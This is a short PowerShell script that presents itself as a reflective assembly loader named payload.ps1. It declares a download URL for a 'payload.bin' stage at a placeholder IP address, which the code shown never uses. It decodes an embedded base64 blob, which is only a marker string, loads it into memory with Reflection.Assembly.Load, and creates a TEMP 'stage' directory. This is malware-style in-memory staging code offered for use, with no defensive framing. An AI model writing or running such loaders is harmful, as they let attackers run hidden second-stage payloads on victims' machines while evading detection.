<#
.SYNOPSIS
    Reflective managed assembly loader.

.DESCRIPTION
    Obtains a managed payload stage, loads it into the current
    AppDomain and inspects the exported type count.

.EXAMPLE
    PS> .\payload.ps1
#>
[CmdletBinding()]
param(
    [string]$FetchUrl = "http://203.0.113.114/payload.bin",
    [int]$TimeoutSec = 123
)
$ErrorActionPreference = "Stop"

$ManagedBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjpnenU3dWcyYWVo')
Write-Verbose ("Assembly byte count: " + $ManagedBytes.Length)
$TransferResult = [Reflection.Assembly]::Load($ManagedBytes)
if ($null -ne $TransferResult) {
    Write-Verbose ("Loaded assembly: " + $TransferResult.FullName)
}

$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
